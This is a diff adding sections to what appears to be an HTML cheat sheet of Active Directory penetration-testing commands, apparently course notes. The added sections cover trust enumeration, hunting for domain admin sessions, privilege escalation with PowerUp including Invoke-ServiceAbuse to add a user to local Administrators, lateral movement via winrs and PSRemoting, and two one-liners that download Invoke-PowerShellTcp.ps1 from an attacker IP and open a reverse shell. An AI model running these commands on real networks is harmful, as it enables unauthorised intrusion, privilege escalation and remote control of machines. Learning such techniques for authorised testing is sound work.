@@ -333,6 +333,37 @@ PS> Get-DomainTrust -Domain <domain>
 PS> Get-ADTrust
 PS> Get-ADTrust -Identity <domain>
 
+<b>::: list all trust current forest</b> AD Module
+
+PS> Get-ADForest | %{Get-ADTrust -Filter *}
+
+<b>::: list trust in current domain</b>
+
+PS> Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+
+PS> Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'
+
+<b>::: list external trust in current forest</b>
+
+PS> Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+
+PS> (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
+
+<b>::: map trusts of a forest</b>
+
+PS> Get-ForestTrust
+PS> Get-ForestTrust -Forest <root/forest>
+
+PS> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
+
+<b>::: map trusts of current domain</b>
+
+PS> Get-ADTrust -Filter *
+
+<b>::: map trusts of external trust</b>
+
+PS> Get-ADTrust -Filter * -Server <xternalTrust>
+
 <b>-FOREST-</b>
 
 <b>::: get details about the current forest</b>
@@ -357,12 +388,120 @@ PS> Get-ForestGlobalCatalog -Forest <root/forest>
 
 PS> Get-ADForest | select -ExpandProperty GlobalCatalogs
 
-<b>::: map trusts of a forest</b>
+<b>-USER HUNTING-</b>
 
-PS> Get-ForestTrust
-PS> Get-ForestTrust -Forest <root/forest>
+<b>::: get list of computers</b>
 
-PS> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
+PS> Get-NetComputer
+
+<b>::: find machines on the current domain where the current user has local admin access</b>
+
+PS> Find-LocalAdminAccess -Verbose
+
+<b>::: check if a computer has local admin access or not</b>
+
+PS> Get-NetComputer <computername> | Invoke-CheckLocalAdminAccess
+
+<b>::: find computers where a domain admin (or specified user/group) has sessions</b>
+
+PS> Find-DomainUserLocation -Verbose
+PS> Find-DomainUserLocation -UserGroupIdentity "<GROUP>"
+
+<b>::: find computers where a domain admin session is available and current user has admin access</b>
+
+PS> Find-DomainUserLocation -CheckAccess
+
+<b>::: find computers (file servers and distributed file servers) where a domain admin session is available.
+
+PS> Find-DomainUserLocation -Stealth
+
+<b>-PRIVILEGE ESCALATION-</b>
+
+Tools:
+
+<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a> 
+
+ways of escalation:
+
+-Missing patches
+–Automated deployment and AutoLogonpasswords in clear text
+–AlwaysInstallElevated(Any user can run MSI as SYSTEM)
+–Misconfigured Services
+–DLL Hijacking and more
+–NTLM Relaying a.k.a. Won't Fix
+
+<b>-PRIVESC LOCAL-</b>
+
+<b>::: get services filepath</b>
+
+PS> Get-WmiObject -Class win32_service | select pathname
+
+note: when checking for services path, it is really important to double check the entire path and if exist an unquoated service. 
+a service path can be abused if is not unquoated.
+
+<b>::: how to get security descriptors</b>
+
+PS> sc.exe sdshow <servicename>
+PS> sc.exe sdshow alg
+PS> sc.exe sdshow snmptrap
+
+<b> POWERUP USAGE</b>
+
+<b>::: import the tool powerUp</b>
+
+1. import invishell
+2. . /path/to/file/PowerUp.ps1
+
+<b>::: get services with unquoated paths and a space in their name</b>
+
+PS> Get-ServiceUnquoated -Verbose
+
+<b>::: get services where the current user can write to its binary path or change arguments to the binary</b>
+
+PS> Get-ModifiableServiceFile -Verbose
+
+<b>::: get the services whose configuration current user can modify</b>
+
+PS> Get-ModifiableService -Verbose
+
+<b>::: abuse of "Get-ModifiableService" and add our current domain user to the local "Administrators" group
+
+PS> Invoke-ServiceAbuse -Name '<serviceName>' -UserName '<domain\user>'
+
+note: doing that will give you an user with local admin rights. to complete the abuse, after the configuration
+is completed, logoff and logon once again.
+
+<b>::: get computers where the user added has local administrative access</b>
+
+<b>Find-PSRemotingLocalAdminAccess.ps1 Tool Usage</b>
+
+powershell remoting...
+** import inviShell and import the module [Find-PSRemotingLocalAdminAccess.ps1]
+
+PS> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+PS> Find-PSRemotingLocalAdminAccess
+
+note: in case exist any result, it means the user added has admin rights on the computer reflected.
+
+<b>::: how to connect to the computer using "winrs" as the student user</b>
+
+<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs">winrs</a> 
+
+PS> winrs -r:<hostname> cmd
+PS> whoami
+PS> hostname
+
+<b>::: how to connect to the computer using PowerShell Remoting</b>
+
+PS> Enter-PSSession -ComputerName <dnshostname>
+
+<b>::: create encoded reverse shell using "Invoke-PowerShellTcp.ps1"</b>
+
+PS> powershell.exe iex (iwr http://<ip_Addr>/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress <ip_Addr> -Port <port>
+
+or
+
+PS> powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<ip_addr>/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress <ip_Addr> -Port 443
 
 </center>
 </body>
